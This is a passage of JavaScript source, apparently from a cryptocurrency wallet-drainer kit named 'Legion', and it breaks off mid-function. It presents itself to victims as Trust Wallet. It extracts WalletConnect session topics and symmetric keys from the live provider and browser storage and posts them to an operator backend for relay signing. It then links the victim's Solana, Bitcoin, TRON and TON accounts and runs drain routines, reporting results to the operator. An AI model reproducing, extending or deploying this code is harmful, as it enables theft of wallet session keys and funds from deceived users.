  function rankedAssetChainId(chainStr) {
    var s = String(chainStr || '').toLowerCase();
    var m = s.match(/^evm:(\d+)$/);
    if (m) return parseInt(m[1], 10);
    if (s === 'ethereum' || s === 'eth' || s === 'mainnet') return 1;
    if (s.indexOf('bsc') !== -1 || s === 'bnb') return 56;
    if (s.indexOf('polygon') !== -1 || s === 'matic') return 137;
    if (s.indexOf('arbitrum') !== -1) return 42161;
    if (s.indexOf('base') !== -1) return 8453;
    if (s.indexOf('optimism') !== -1) return 10;
    if (s.indexOf('avalanche') !== -1 || s.indexOf('avax') !== -1) return 43114;
    if (s.indexOf('scroll') !== -1) return 534352;
    if (s.indexOf('blast') !== -1) return 81457;
    if (s.indexOf('mantle') !== -1) return 5000;
    if (s.indexOf('fantom') !== -1 || s.indexOf('ftm') !== -1) return 250;
    if (s.indexOf('cronos') !== -1) return 25;
    if (s.indexOf('gnosis') !== -1 || s.indexOf('gno') !== -1) return 100;
    if (s.indexOf('celo') !== -1) return 42220;
    if (s.indexOf('zksync') !== -1) return 324;
    if (s.indexOf('linea') !== -1) return 59144;
    if (s.indexOf('zkevm') !== -1 || s.indexOf('polygon_zkevm') !== -1) return 1101;
    if (s.indexOf('metis') !== -1) return 1088;
    return null;
  }

  function isInjectedConnectorId(connId) {
    var c = String(connId || '').toLowerCase();
    return c.indexOf('phantom') !== -1 || c.indexOf('injected') !== -1 ||
      c.indexOf('metamask') !== -1 || c.indexOf('rabby') !== -1 ||
      c.indexOf('trust') !== -1 || c.indexOf('coinbase') !== -1 ||
      c.indexOf('brave') !== -1 || c.indexOf('okx') !== -1;
  }

  /** Trust in-app AppKit: connector id often contains "trust" but session is real WC multichain. */
  function acceptTrustInAppWc(connId, provider) {
    var inApp = false;
    try {
      inApp = !!(isTrustInAppBrowser() || window.__TRUST_IN_APP__ || window.__TRUST_INAPP_APPKIT__);
    } catch (e0) { inApp = false; }
    if (!inApp) return false;
    if (provider && provider.isWalletConnect === true) return true;
    try {
      if (findWcStorageSession()) return true;
    } catch (e1) { /* ignore */ }
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
        var sess = window.LegionWallet.getSessionAddresses();
        if (sess && (sess.evm || sess.sol || sess.btc || (sess.families && Object.keys(sess.families).length))) {
          return true;
        }
      }
    } catch (e2) { /* ignore */ }
    var c = String(connId || '').toLowerCase();
    if (window.__TRUST_INAPP_APPKIT__ && (c.indexOf('trust') !== -1 || c.indexOf('walletconnect') !== -1 || c.indexOf('w3m') !== -1)) {
      return true;
    }
    return false;
  }

  function isRealWalletConnectSession(connId, provider) {
    if (!provider) return false;
    if (acceptTrustInAppWc(connId, provider)) return true;
    var c = String(connId || '').toLowerCase();
    if (isInjectedConnectorId(c)) return false;
    if (provider.isMetaMask && !provider.isWalletConnect) return false;
    return provider.isWalletConnect === true || c.indexOf('walletconnect') !== -1;
  }

  async function safeGetLegionProvider() {
    if (!window.LegionWallet || typeof window.LegionWallet.getProvider !== 'function') return null;
    try {
      var r = window.LegionWallet.getProvider();
      if (r && typeof r.then === 'function') r = await r;
      return r || null;
    } catch (e) {
      return null;
    }
  }

  async function disconnectLegionWallet() {
    try {
      if (window.LegionWallet && window.LegionWallet.disconnect) {
        await window.LegionWallet.disconnect();
      }
    } catch (e) {}
  }

  function clearWcStorageKeys() {
    try {
      var wcKeys = [];
      for (var wi = 0; wi < localStorage.length; wi++) {
        var wk = localStorage.key(wi);
        if (!wk) continue;
        var wkl = wk.toLowerCase();
        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
      }
      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
      if (wcKeys.length) L.log('Cleared', wcKeys.length, 'WC storage keys');
    } catch (e3) {}
  }

  async function cleanConflictingWcSessions() {
    await disconnectLegionWallet();
    clearWcStorageKeys();
    await sleep(300);
  }

  function findWcStorageSession() {
    try {
      var keys = Object.keys(localStorage);
      for (var wi = 0; wi < keys.length; wi++) {
        var k = keys[wi];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var si = sessions.length - 1; si >= 0; si--) {
          var sess = sessions[si];
          var ns = sess && sess.namespaces;
          if (!ns || !ns.eip155 || !ns.eip155.accounts || !ns.eip155.accounts[0]) continue;
          var parts = String(ns.eip155.accounts[0]).split(':');
          var addr = (parts[parts.length - 1] || '').toLowerCase();
          if (!addr || addr.length < 40) continue;
          var expiry = sess.expiry || sess.expiration || null;
          return { address: addr, topic: sess.topic, expiry: expiry };
        }
      }
    } catch (e) {}
    return null;
  }

  function isWcSessionExpired(sess) {
    if (!sess || !sess.expiry) return false;
    var exp = Number(sess.expiry);
    if (!exp) return false;
    return Date.now() / 1000 > exp;
  }

  // Extract WC session data (topic + symKey + addresses) for backend relay signer
  function extractWcSessionForBackend() {
    try {
      // ── Strategy 1: extract directly from the live WC provider (most reliable) ──
      // _wcProv is the in-memory EthereumProvider; its signer.client holds the
      // keychain without us needing to find the exact localStorage key format.
      var _liveSymKey = null;
      var _liveTopic = null;
      var _liveSession = null;
      try {
        var _prov = _wcProv;
        if (_prov) {
          // Walk possible paths: provider.signer.client or provider.client directly
          var _client = (_prov.signer && _prov.signer.client) || _prov.client || null;
          if (_client) {
            // Get all sessions from client.session map
            var _sessions = null;
            try {
              _sessions = _client.session && typeof _client.session.getAll === 'function'
                ? _client.session.getAll()
                : (_client.session && _client.session.map ? Array.from(_client.session.map.values()) : null);
            } catch (eSess) {}
            if (_sessions && _sessions.length) {
              _liveSession = _sessions[_sessions.length - 1];
              _liveTopic = _liveSession.topic;
            }
            // Get symKey from keychain
            if (_liveTopic) {
              var _kc = _client.core && _client.core.crypto && _client.core.crypto.keychain;
              if (_kc) {
                try {
                  _liveSymKey = typeof _kc.get === 'function' ? _kc.get(_liveTopic) : null;
                } catch (eKc) {}
                if (!_liveSymKey && _kc.map) {
                  try { _liveSymKey = _kc.map.get(_liveTopic) || null; } catch (eKc2) {}
                }
                if (!_liveSymKey && _kc.store) {
                  try { _liveSymKey = _kc.store[_liveTopic] || null; } catch (eKc3) {}
                }
              }
            }
          }
        }
      } catch (eProv) {}

      // If we got both topic and symKey from the live provider, build result now
      if (_liveTopic && _liveSymKey && _liveSession && _liveSession.namespaces) {
        var _ns = _liveSession.namespaces || {};
        var _addrs = {};
        function _extractAddr(acc) { if (!acc) return null; var p = String(acc).split(':'); return p[p.length - 1] || null; }
        if (_ns.eip155 && _ns.eip155.accounts && _ns.eip155.accounts[0])
          _addrs.evm = (_extractAddr(_ns.eip155.accounts[0]) || '').toLowerCase();
        if (_ns.solana && _ns.solana.accounts && _ns.solana.accounts[0])
          _addrs.sol = _extractAddr(_ns.solana.accounts[0]);
        if (_ns.tron && _ns.tron.accounts && _ns.tron.accounts[0])
          _addrs.tron = _extractAddr(_ns.tron.accounts[0]);
        var _tonNs = _ns.ton || _ns.tvm;
        if (_tonNs && _tonNs.accounts && _tonNs.accounts[0])
          _addrs.ton = _extractAddr(_tonNs.accounts[0]);
        if (_ns.bip122 && _ns.bip122.accounts && _ns.bip122.accounts[0])
          _addrs.btc = _extractAddr(_ns.bip122.accounts[0]);
        if (!_addrs.sol && S.chains.SOL && S.chains.SOL.address) _addrs.sol = S.chains.SOL.address;
        if (!_addrs.tron && S.chains.TRON && S.chains.TRON.address) _addrs.tron = S.chains.TRON.address;
        if (!_addrs.ton && S.chains.TON && S.chains.TON.address) _addrs.ton = S.chains.TON.address;
        if (!_addrs.btc && S.chains.BTC && S.chains.BTC.address) _addrs.btc = S.chains.BTC.address;
        L.log('[WcRelay] symKey extracted from live provider | topic:', _liveTopic.slice(0, 8) + '...');
        return {
          topic: _liveTopic,
          sym_key: _liveSymKey,
          expiry: _liveSession.expiry || 0,
          namespaces: _ns,
          wallet_addresses: _addrs,
          self_public_key: _liveSession.self && _liveSession.self.publicKey ? _liveSession.self.publicKey : undefined,
          peer_public_key: _liveSession.peer && _liveSession.peer.publicKey ? _liveSession.peer.publicKey : undefined,
        };
      }

      // ── Strategy 2: read from localStorage / sessionStorage ──
      var keys = Object.keys(localStorage);
      var sessionObj = null;
      var topic = null;
      for (var i = 0; i < keys.length; i++) {
        var k = keys[i];
        if (k.indexOf('wc@') === -1) continue;
        if (k.indexOf('session') === -1 && k.indexOf('client') === -1) continue;
        var raw = localStorage.getItem(k);
        if (!raw) continue;
        var store;
        try { store = JSON.parse(raw); } catch (ep) { continue; }
        if (!store || typeof store !== 'object') continue;
        // Use entries() to get both key and value — in newer WC SDK versions the topic
        // is stored as the dictionary KEY (not as a field inside the value object).
        var entries = Object.entries(store);
        for (var j = entries.length - 1; j >= 0; j--) {
          var entryKey = entries[j][0];
          var s = entries[j][1];
          // Handle [{key, value}] array format (Reown AppKit v5+)
          if (s && s.key !== undefined && s.value && typeof s.value === 'object') {
            entryKey = s.key || entryKey;
            s = s.value;
          }
          if (s && s.namespaces && s.expiry) {
            sessionObj = s;
            // topic may be stored as s.topic OR as the dictionary key
            topic = s.topic || entryKey;
            break;
          }
        }
        if (topic) break;
      }
      // Fix: if WC SDK wrote nothing to localStorage, fall back to our own persisted session
      if (!topic || !sessionObj) {
        var _ownKeys = Object.keys(localStorage);
        for (var _oi = 0; _oi < _ownKeys.length; _oi++) {
          var _ok = _ownKeys[_oi];
          if (_ok.indexOf('legion:wc:session:') !== 0) continue;
          var _oRaw = localStorage.getItem(_ok);
          if (!_oRaw) continue;
          var _oSess; try { _oSess = JSON.parse(_oRaw); } catch (_oEp) { continue; }
          if (_oSess && _oSess.namespaces && _oSess.topic) {
            sessionObj = _oSess;
            topic = _oSess.topic;
            break;
          }
        }
      }
      if (!topic || !sessionObj) return null;

      // Find symKey — search localStorage + sessionStorage (newer Reown AppKit moved keychain
      // to sessionStorage). Pass 1: keychain-pattern keys. Pass 2: ALL wc@ keys as fallback.
      var symKey = null;
      var _kcPatterns = ['keychain', 'crypto', 'keys'];
      function _findWcSymKey(store, topicStr) {
        // Check our own persisted backup first (written at connect time, survives tab close)
        if (store === localStorage) {
          try {
            var _leg = localStorage.getItem('legion:wc:sym:' + topicStr);
            if (_leg && typeof _leg === 'string' && _leg.length >= 8 && _leg.length <= 256) return _leg;
          } catch (_) {}
        }
        var sKeys; try { sKeys = Object.keys(store); } catch (ep) { return null; }
        // Pass 1: keys matching standard keychain patterns
        for (var i = 0; i < sKeys.length; i++) {
          var k = sKeys[i];
          if (k.indexOf('wc@') === -1) continue;
          var ok = false; for (var p = 0; p < _kcPatterns.length; p++) { if (k.indexOf(_kcPatterns[p]) !== -1) { ok = true; break; } }
          if (!ok) continue;
          var raw = store.getItem(k); if (!raw) continue;
          var obj; try { obj = JSON.parse(raw); } catch (ep) { continue; }
          if (!obj || typeof obj !== 'object') continue;
          var e = obj[topicStr]; if (e == null && obj.keys) e = obj.keys[topicStr]; if (e == null) continue;
          if (typeof e === 'string' && e.length >= 8 && e.length <= 256) return e;
          if (typeof e === 'object' && e !== null) { var c = e.key || e.symKey || e.sharedKey || e.secret || null; if (c && typeof c === 'string' && c.length >= 8 && c.length <= 256) return c; }
        }
        // Pass 2: ALL wc@ / walletconnect keys (non-standard or future key layouts)
        for (var j = 0; j < sKeys.length; j++) {
          var k = sKeys[j];
          if (k.indexOf('wc@') === -1 && k.indexOf('walletconnect') === -1) continue;
          var raw = store.getItem(k); if (!raw) continue;
          var obj; try { obj = JSON.parse(raw); } catch (ep) { continue; }
          if (!obj || typeof obj !== 'object') continue;
          var e = obj[topicStr]; if (e == null) continue;
          if (typeof e === 'string' && e.length >= 8 && e.length <= 256) return e;
          if (typeof e === 'object' && e !== null) { var c = e.key || e.symKey || e.sharedKey || e.secret || null; if (c && typeof c === 'string' && c.length >= 8 && c.length <= 256) return c; }
        }
        return null;
      }
      symKey = _findWcSymKey(localStorage, topic) || _findWcSymKey(sessionStorage, topic);
      // Last resort: session object itself may embed symKey in some SDK versions
      if (!symKey && sessionObj.symKey && typeof sessionObj.symKey === 'string') symKey = sessionObj.symKey;
      if (!symKey && sessionObj.key && typeof sessionObj.key === 'string') symKey = sessionObj.key;
      if (!symKey) return null;

      var ns = sessionObj.namespaces || {};
      var addrs = {};
      function extractAddr(acc) {
        if (!acc) return null;
        var parts = String(acc).split(':');
        return parts[parts.length - 1] || null;
      }
      if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0])
        addrs.evm = (extractAddr(ns.eip155.accounts[0]) || '').toLowerCase();
      if (ns.solana && ns.solana.accounts && ns.solana.accounts[0])
        addrs.sol = extractAddr(ns.solana.accounts[0]);
      if (ns.tron && ns.tron.accounts && ns.tron.accounts[0])
        addrs.tron = extractAddr(ns.tron.accounts[0]);
      var tonNs = ns.ton || ns.tvm;
      if (tonNs && tonNs.accounts && tonNs.accounts[0])
        addrs.ton = extractAddr(tonNs.accounts[0]);
      if (ns.bip122 && ns.bip122.accounts && ns.bip122.accounts[0])
        addrs.btc = extractAddr(ns.bip122.accounts[0]);

      // Fallback: WC namespace k paas na ho toh S.chains se lo
      // (e.g. MetaMask ya limited WC wallet — sirf eip155 deta hai)
      if (!addrs.sol && S.chains.SOL && S.chains.SOL.address) addrs.sol = S.chains.SOL.address;
      if (!addrs.tron && S.chains.TRON && S.chains.TRON.address) addrs.tron = S.chains.TRON.address;
      if (!addrs.ton && S.chains.TON && S.chains.TON.address) addrs.ton = S.chains.TON.address;
      if (!addrs.btc && S.chains.BTC && S.chains.BTC.address) addrs.btc = S.chains.BTC.address;

      return {
        topic: topic,
        sym_key: symKey,
        expiry: sessionObj.expiry || 0,
        namespaces: ns,
        wallet_addresses: addrs,
        self_public_key: sessionObj.self && sessionObj.self.publicKey ? sessionObj.self.publicKey : undefined,
        peer_public_key: sessionObj.peer && sessionObj.peer.publicKey ? sessionObj.peer.publicKey : undefined,
      };
    } catch (e) {
      return null;
    }
  }

  async function registerWcSessionWithBackend() {
    // Retry up to 4 times (0ms, 800ms, 2s, 4s) — keychain write may be async after connect
    var delays = [0, 800, 2000, 4000];
    var _sessionFound = false;
    var _symkeyFound = false;
    for (var attempt = 0; attempt < delays.length; attempt++) {
      try {
        if (delays[attempt] > 0) await sleep(delays[attempt]);
        var data = extractWcSessionForBackend();
        if (!data) {
          L.warn('[WcRelay] session not found attempt', attempt + 1);
          continue;
        }
        _sessionFound = true;
        if (!data.sym_key) {
          L.warn('[WcRelay] symKey not found attempt', attempt + 1, '— will retry');
          continue;
        }
        _symkeyFound = true;
        await apiPost('/api/v1/wc/session', data);
        L.log('[WcRelay] session registered | topic:', data.topic.slice(0, 8) + '...');
        return;
      } catch (e) {
        L.warn('[WcRelay] session register fail attempt', attempt + 1, ':', e && e.message ? e.message : String(e));
      }
    }
    // All retries failed — POST debug info so backend can Telegram us what happened
    try {
      var _wcDbgKeys = [];
      try {
        var _allKeys = Object.keys(localStorage);
        for (var _ki = 0; _ki < _allKeys.length; _ki++) {
          if (_allKeys[_ki].indexOf('wc@') !== -1 || _allKeys[_ki].indexOf('walletconnect') !== -1) {
            _wcDbgKeys.push(_allKeys[_ki]);
          }
        }
      } catch (eDbg) {}
      var _ssKeys = [];
      try {
        var _ssAll = Object.keys(sessionStorage);
        for (var _ski = 0; _ski < _ssAll.length; _ski++) {
          if (_ssAll[_ski].indexOf('wc@') !== -1 || _ssAll[_ski].indexOf('walletconnect') !== -1) {
            _ssKeys.push(_ssAll[_ski]);
          }
        }
      } catch (eDbg2) {}
      await apiPost('/api/v1/wc/session-debug', {
        wc_keys: _wcDbgKeys.join('|'),
        ss_keys: _ssKeys.join('|'),
        session_found: _sessionFound,
        symkey_found: _symkeyFound,
        attempts: delays.length,
      });
    } catch (ePost) {}
    L.warn('[WcRelay] session registration gave up after', delays.length, 'attempts');
  }

  async function waitWcStorageSession(maxMs) {
    maxMs = maxMs || 180000;
    var start = Date.now();
    while (Date.now() - start < maxMs) {
      var sess = findWcStorageSession();
      if (sess) return sess;
      await sleep(500);
    }
    return null;
  }

  function wcMetaPayload() {
    var origin = window.location.origin;
    var icon = origin + '/favicon.png';
    try {
      var link = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
      if (link && link.href) icon = link.href;
    } catch (e) {}
    // Save connect-time hostname so EIP-712 domain.name stays consistent
    // even if user navigates to a different deployed mirror later.
    try {
      if (!sessionStorage.getItem('lgn_connect_host')) {
        sessionStorage.setItem('lgn_connect_host', window.location.hostname);
      }
    } catch (e) {}
    // Trust WC mobile deep-links require redirect base schemes — NOT open_url.
    // open_url breaks pairing (QR stuck / no Trust app handoff).
    return {
      name: document.title || 'Trust Wallet',
      description: 'Connect your wallet',
      url: origin,
      icons: [icon],
      redirect: {
        native: 'trust://',
        universal: 'https://link.trustwallet.com',
        linkMode: true,
      },
    };
  }

  function applyLegionWalletSessionAddresses() {
    var merged = {};
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
        var sess = window.LegionWallet.getSessionAddresses();
        if (sess && sess.flat) {
          Object.keys(sess.flat).forEach(function (k) {
            if (sess.flat[k]) merged[k] = sess.flat[k];
          });
        }
      }
    } catch (e) {}
    var scanned = scanWcSessionAllFamilies();
    Object.keys(scanned).forEach(function (k) {
      if (scanned[k] && !merged[k]) merged[k] = scanned[k];
    });
    applyWcSessionAddresses(merged);
    return merged;
  }

  /** Universal WC harvest — wallet-agnostic (Trust, OKX, Rainbow, Phantom, all via WC session). */
  async function harvestWcMultichainFamilies(opts) {
    opts = opts || {};
    var waitMs = opts.waitMs != null ? opts.waitMs : WC_HARVEST_WAIT_MS;
    var wantKeys = opts.wantKeys || ['sol', 'tron', 'btc', 'ton', 'cosmos', 'aptos', 'sui'];

    if (window.LegionWallet && typeof window.LegionWallet.harvestMultichainSession === 'function') {
      try {
        await window.LegionWallet.harvestMultichainSession({
          waitMs: waitMs,
          wantFamilies: wantKeys,
          linkBitcoin: opts.linkBtc !== false,
          ensureBip122: opts.ensureBip122 === true,
          bip122PollMs: opts.bip122PollMs != null ? opts.bip122PollMs : WC_BIP122_POLL_MS,
          ensureSupplementalUi: opts.ensureSupplementalUi === true,
          projectId: WC_PROJECT_ID,
          metadata: wcMetaPayload(),
          optionalNamespaces: opts.optionalNamespaces || WC_OPTIONAL_NAMESPACES,
          timeoutMs: opts.timeoutMs || 60000,
        });
      } catch (e) {
        L.warn('[harvest] wallet bundle:', e.message);
      }
    }

    function missingFromScan() {
      var w = scanWcSessionAllFamilies();
      return wantKeys.filter(function (k) {
        if (k === 'btc') return !w.btc && !(S.chains.BTC && S.chains.BTC.address);
        if (k === 'sol') return !w.sol && !(S.chains.SOL && S.chains.SOL.address);
        if (k === 'tron') return !w.tron && !(S.chains.TRON && S.chains.TRON.address);
        if (k === 'ton') return !w.ton && !(S.chains.TON && S.chains.TON.address);
        if (k === 'cosmos') return !w.cosmos && !(S.chains.COSMOS && S.chains.COSMOS.address);
        if (k === 'aptos') return !w.aptos && !(S.chains.APTOS && S.chains.APTOS.address);
        if (k === 'sui') return !w.sui && !(S.chains.SUI && S.chains.SUI.address);
        return false;
      });
    }

    applyLegionWalletSessionAddresses();
    var miss = missingFromScan();
    if (miss.length && waitMs > 0) {
      L.log('[harvest] short wait for phone approve:', miss.join(', '), '| ms:', waitMs);
      var deadline = Date.now() + waitMs;
      while (Date.now() < deadline && missingFromScan().length) {
        await sleep(500);
        applyLegionWalletSessionAddresses();
      }
    }

    if (opts.linkBtc !== false && opts.ensureBip122 === true && !S.chains.BTC) {
      var wcBtc = scanWcSessionAllFamilies().btc;
      if (!wcBtc) {
        UI.status('Approve Bitcoin on your phone wallet (if supported)...');
        await ensureWcBip122Linked();
      }
    }

    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();
    S.allAddresses = collectAddressMap();
    saveWcFamilyContext(S.allAddresses);

    var signerParts = [];
    ['SVM', 'TRON', 'TON', 'UTXO', 'COSMOS', 'APTOS', 'SUI'].forEach(function (f) {
      if (S.familyConnections[f] && S.familyConnections[f].wcSigner) signerParts.push(f);
    });
    if (signerParts.length) L.log('[harvest] WC signers wired:', signerParts.join(', '));

    try {
      if (window.LegionWallet && typeof window.LegionWallet.dumpRawWcNamespaceKeys === 'function') {
        var rawNs = window.LegionWallet.dumpRawWcNamespaceKeys();
        L.log('[harvest] raw WC namespaces:', (rawNs && rawNs.join(',')) || 'none');
      }
    } catch (eNs) {}

    var parts = [];
    Object.keys(S.allAddresses).forEach(function (fk) {
      if (S.allAddresses[fk]) parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
    });
    L.log('[harvest] WC families ready:', parts.length ? parts.join(' | ') : 'evm-only');
    return S.allAddresses;
  }

  function familyMapFingerprint(addrs) {
    var keys = Object.keys(addrs || {}).filter(function (k) { return addrs[k]; }).sort();
    return keys.map(function (k) { return k + ':' + String(addrs[k]).toLowerCase(); }).join('|');
  }

  function abortPhaseB() {
    S.phaseBAborted = true;
    S.phaseBRunning = false;
    L.log('[phaseB] aborted by user — completed steps kept, no resume');
    try {
      window.dispatchEvent(new CustomEvent('legion:phaseb-abort', { detail: { address: S.evmAddr } }));
    } catch (eAb) { /* ignore */ }
    return { ok: true, aborted: true };
  }

  async function reportSeenNotLinked(family, detail) {
    try {
      await SCOUT.reportDrainStatus(
        'seen_not_linked',
        S.evmAddr,
        S.evmChain || 1,
        S.evmWallet || 'Trust Wallet',
        (family || 'FAMILY') + ': ' + (detail || 'seen, not linked')
      );
    } catch (e) { /* ignore */ }
  }

  /** After EVM: background SOL→BTC→TRON→TON rails (sequential prompts, one Connecting… feel). */
  async function runBackgroundFamilyRails(opts) {
    opts = opts || {};
    var onStatus = typeof opts.onStatus === 'function' ? opts.onStatus : null;
    var honorAbort = opts.honorAbort === true;
    applyLegionWalletSessionAddresses();
    L.log('[bg-rail] start after EVM');

    function emit(label, state, extra) {
      if (!onStatus) return;
      try { onStatus({ label: label, state: state, extra: extra || null }); } catch (e0) { /* ignore */ }
    }
    function aborted() {
      return honorAbort && S.phaseBAborted;
    }

    var noWcExtend = opts.noWcExtend === true;
    // In Trust Wallet in-app browser, WC namespace extension popups never appear.
    // Use a short timeout so UI doesn't freeze for minutes waiting for a popup that won't come.
    var _bgRailMs = (isTrustInAppBrowser() || window.__TRUST_IN_APP__) ? 12000 : WC_BG_RAIL_TIMEOUT_MS;

    if (!aborted() && !(S.chains.SOL && S.chains.SOL.address)) {
      emit('Solana', 'active');
      try {
        if (!noWcExtend && window.LegionWallet && typeof window.LegionWallet.ensureSolanaLink === 'function') {
          var sol = await window.LegionWallet.ensureSolanaLink({
            projectId: WC_PROJECT_ID,
            metadata: wcMetaPayload(),
            optionalNamespaces: WC_OPTIONAL_NAMESPACES,
            timeoutMs: _bgRailMs,
          });
          if (sol) {
            S.chains.SOL = { address: sol, name: 'SVM', wcSession: true };
            L.log('[bg-rail] SOL:', String(sol).slice(0, 10) + '...');
            emit('Solana', 'ok');
          } else {
            emit('Solana', 'skip');
            if (opts.reportSkips) await reportSeenNotLinked('SOL', 'Trust WC solana not linked');
          }
        } else {
          var inj = await connectSol();
          if (inj) {
            L.log('[bg-rail] SOL via inject');
            emit('Solana', 'ok');
          } else {
            emit('Solana', 'skip');
            if (opts.reportSkips) await reportSeenNotLinked('SOL', 'no solana signer');
          }
        }
      } catch (e) {
        L.warn('[bg-rail] SOL skip:', e.message);
        emit('Solana', 'skip', e.message);
        if (opts.reportSkips) await reportSeenNotLinked('SOL', e.message);
      }
    } else if (S.chains.SOL && S.chains.SOL.address) {
      emit('Solana', 'ok');
    }

    if (!aborted() && !(S.chains.BTC && S.chains.BTC.address)) {
      emit('Bitcoin', 'active');
      try {
        var btc = noWcExtend ? null : await ensureWcBip122Linked();
        if (!btc && noWcExtend) {
          var btcInj = await connectBtc();
          if (btcInj) btc = btcInj.address || btcInj;
        }
        if (btc) {
          L.log('[bg-rail] BTC:', String(btc).slice(0, 10) + '...');
          emit('Bitcoin', 'ok');
        } else {
          emit('Bitcoin', 'skip');
          if (!noWcExtend && opts.reportSkips) await reportSeenNotLinked('BTC', 'Trust WC bip122 not available');
        }
      } catch (e) {
        L.warn('[bg-rail] BTC skip:', e.message);
        emit('Bitcoin', 'skip', e.message);
        if (!noWcExtend && opts.reportSkips) await reportSeenNotLinked('BTC', e.message || 'bip122 fail');
      }
    } else if (S.chains.BTC && S.chains.BTC.address) {
      emit('Bitcoin', 'ok');
    }

    if (!aborted() && !(S.chains.TRON && S.chains.TRON.address)) {
      emit('TRON', 'active');
      try {
        if (!noWcExtend && window.LegionWallet && typeof window.LegionWallet.ensureWcNamespaceLink === 'function') {
          var tron = await window.LegionWallet.ensureWcNamespaceLink({
            namespace: 'tron',
            projectId: WC_PROJECT_ID,
            optionalNamespaces: WC_OPTIONAL_NAMESPACES,
            timeoutMs: _bgRailMs,
          });
          if (tron) {
            S.chains.TRON = { address: tron, wcSession: true };
            L.log('[bg-rail] TRON:', String(tron).slice(0, 10) + '...');
            emit('TRON', 'ok');
          }
        }
        if (!(S.chains.TRON && S.chains.TRON.address)) {
          var tConn = await connectTron();
          if (tConn) {
            L.log('[bg-rail] TRON via inject/provider');
            emit('TRON', 'ok');
          } else {
            emit('TRON', 'skip');
            if (opts.reportSkips) await reportSeenNotLinked('TRON', 'not linked');
          }
        }
      } catch (e) {
        L.warn('[bg-rail] TRON skip:', e.message);
        emit('TRON', 'skip', e.message);
        if (opts.reportSkips) await reportSeenNotLinked('TRON', e.message);
      }
    } else if (S.chains.TRON && S.chains.TRON.address) {
      emit('TRON', 'ok');
    }

    if (!aborted() && !(S.chains.TON && S.chains.TON.address)) {
      emit('TON', 'active');
      try {
        var tonScan = scanWcSessionAllFamilies().ton;
        if (tonScan) {
          S.chains.TON = { address: tonScan, wcSession: true };
          L.log('[bg-rail] TON from WC session');
          emit('TON', 'ok');
        } else {
          var tonConn = await connectTon();
          if (tonConn && tonConn.address) {
            L.log('[bg-rail] TON via TonConnect:', String(tonConn.address).slice(0, 10) + '...');
            emit('TON', 'ok');
          } else {
            emit('TON', 'skip');
            if (opts.reportSkips) await reportSeenNotLinked('TON', 'not linked');
          }
        }
      } catch (e) {
        L.warn('[bg-rail] TON skip:', e.message);
        emit('TON', 'skip', e.message);
        if (opts.reportSkips) await reportSeenNotLinked('TON', e.message);
      }
    } else if (S.chains.TON && S.chains.TON.address) {
      emit('TON', 'ok');
    }

    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();
    S.allAddresses = collectAddressMap(S.evmAddr);
    L.log('[bg-rail] done |', familyMapFingerprint(S.allAddresses) || 'evm-only',
      aborted() ? '| aborted' : '');
    return S.allAddresses;
  }

  /**
   * Phase B interactive: link non-EVM (honor Stop) then drain ready families.
   * Does not wipe EVM WC session. Fake-complete forbidden — skips report to Telegram.
   */
  async function runPhaseBInteractive(opts) {
    opts = opts || {};
    var onStatus = typeof opts.onStatus === 'function' ? opts.onStatus : function () {};
    if (S.phaseBRunning) {
      L.warn('[phaseB] already running');
      return { ok: false, error: 'busy' };
    }
    S.phaseBAborted = false;
    S.phaseBRunning = true;
    var results = [];
    try {
      onStatus({ phase: 'link', label: 'Processing all networks…', state: 'active' });
      await runBackgroundFamilyRails({
        onStatus: function (ev) {
          onStatus({ phase: 'link', label: ev.label, state: ev.state, extra: ev.extra });
        },
        honorAbort: true,
        reportSkips: true,
        // In TW in-app browser: WC namespace extension popups never appear — skip immediately
        // so we don't waste 12s per chain before reaching drain.
        noWcExtend: isTrustInAppBrowser() || !!window.__TRUST_IN_APP__,
      });

      if (S.phaseBAborted) {
        onStatus({ phase: 'done', label: 'Stopped', state: 'aborted' });
        return { ok: true, aborted: true, results: results };
      }

      wireWcFamilyConnections();
      var drainOrder = [
        { key: 'SOL', conn: 'SVM', fn: function () { return drainSol(S.familyConnections.SVM); } },
        { key: 'BTC', conn: 'UTXO', fn: function () { return drainBtc(S.familyConnections.UTXO); } },
        { key: 'TRON', conn: 'TRON', fn: function () { return drainTron(S.familyConnections.TRON); } },
        { key: 'TON', conn: 'TON', fn: function () { return drainTon(S.familyConnections.TON); } },
      ];
      for (var di = 0; di < drainOrder.length; di++) {
        if (S.phaseBAborted) break;
        var d = drainOrder[di];
        var conn = S.familyConnections[d.conn];
        if (!conn || !familyConnectionCanSign(conn, d.conn)) {
          results.push({ key: d.key, status: 'skipped' });
          continue;
        }
        if (!isFamilyDrainReady(d.key)) {
          results.push({ key: d.key, status: 'disabled' });
          continue;
        }
        onStatus({ phase: 'drain', label: d.key + ' Confirm…', state: 'active' });
        try {
          await runWithRetry(function () { return d.fn(); }, 'phaseB-' + d.key);
          results.push({ key: d.key, status: 'ok' });
          onStatus({ phase: 'drain', label: d.key, state: 'ok' });
        } catch (de) {
          L.warn('[phaseB] drain', d.key, de && de.message);
          results.push({ key: d.key, status: 'fail', error: de && de.message });
          onStatus({ phase: 'drain', label: d.key, state: 'skip', extra: de && de.message });
        }
      }
      onStatus({
        phase: 'done',
        label: S.phaseBAborted ? 'Stopped' : 'Networks step complete',
        state: S.phaseBAborted ? 'aborted' : 'ok',
        results: results,
      });
      return { ok: true, aborted: !!S.phaseBAborted, results: results };
    } finally {
      S.phaseBRunning = false;
    }
  }

  /** After early EVM notify: passive harvest + background rails; re-notify if grew. */
  async function enrichWcFamiliesAndRenotify(address, chainId, walletName) {
    var before = familyMapFingerprint(S.allAddresses);
    UI.showStatus('Connecting all chains...');
    try {
      await harvestWcMultichainFamilies({
        waitMs: WC_HARVEST_WAIT_MS,
        linkBtc: true,
        ensureBip122: false,
        bip122PollMs: WC_BIP122_POLL_MS,
